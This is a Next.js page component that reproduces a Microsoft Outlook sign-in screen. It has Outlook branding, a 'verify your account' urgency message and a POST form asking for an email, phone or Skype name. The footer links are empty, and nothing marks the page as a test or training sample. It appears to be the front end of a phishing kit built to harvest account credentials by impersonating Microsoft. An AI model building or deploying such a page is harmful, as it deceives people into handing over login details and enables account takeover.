import Head from "next/head";
import Image from "next/image";
import styles from "../styles/Index.module.css";

export default function Home() {
  return (
    <div className={`${styles.container} ${styles.flow}`}>
      <Head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Sign in your account</title>

        <link
          rel="apple-touch-icon-precomposed"
          sizes="57x57"
          href="/assets/favicomatic/"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="114x114"
          href="/assets/favicomatic/apple-touch-icon-114x114.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="72x72"
          href="/assets/favicomatic/apple-touch-icon-72x72.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="144x144"
          href="/assets/favicomatic/apple-touch-icon-144x144.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="60x60"
          href="/assets/favicomatic/apple-touch-icon-60x60.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="120x120"
          href="/assets/favicomatic/apple-touch-icon-120x120.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="76x76"
          href="/assets/favicomatic/apple-touch-icon-76x76.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="152x152"
          href="/assets/favicomatic/apple-touch-icon-152x152.png"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-196x196.png"
          sizes="196x196"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-96x96.png"
          sizes="96x96"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-32x32.png"
          sizes="32x32"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-16x16.png"
          sizes="16x16"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-128.png"
          sizes="128x128"
        />
        <meta name="application-name" content="&nbsp;" />
        <meta name="msapplication-TileColor" content="#FFFFFF" />
        <meta name="msapplication-TileImage" content="mstile-144x144.png" />
        <meta name="msapplication-square70x70logo" content="mstile-70x70.png" />
        <meta
          name="msapplication-square150x150logo"
          content="mstile-150x150.png"
        />
        <meta
          name="msapplication-wide310x150logo"
          content="mstile-310x150.png"
        />
        <meta
          name="msapplication-square310x310logo"
          content="mstile-310x310.png"
        />
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
        />
      </Head>

      <main className={`${styles.main} ${styles.flow} `}>
        <h1 className={styles.h1}>Outlook</h1>
        <img
          src="/assets/logo.png"
          alt=""
          aria-hidden="true"
          className={styles.img}
        />
        <h2 className={styles.h2}>Sign in</h2>
        <p className={styles.p}>to continue to Outlook</p>
        <p className={styles.p}>
          Because you're accessing sensitive info, you need to verify your
          account
        </p>
        <form
          action=""
          method="POST"
          className={`${styles.flow} ${styles.form}`}
        >
          <input
            type="text"
            name="account"
            placeholder="Email, phone, or Skype"
            className={styles.input}
          />
          <input type="submit" value="Next" className={styles.input} />
        </form>
      </main>
      <nav className={styles.nav}>
        <ul role="list" className={styles.ul}>
          <li>
            <a href="" className={styles.a}>
              Terms of use
            </a>
          </li>
          <li>
            <a href="" className={styles.a}>
              Privacy &amp; cookies
            </a>
          </li>
          <li>
            <a href="" className={styles.a}>
              ...
            </a>
          </li>
        </ul>
      </nav>
    </div>
  );
}
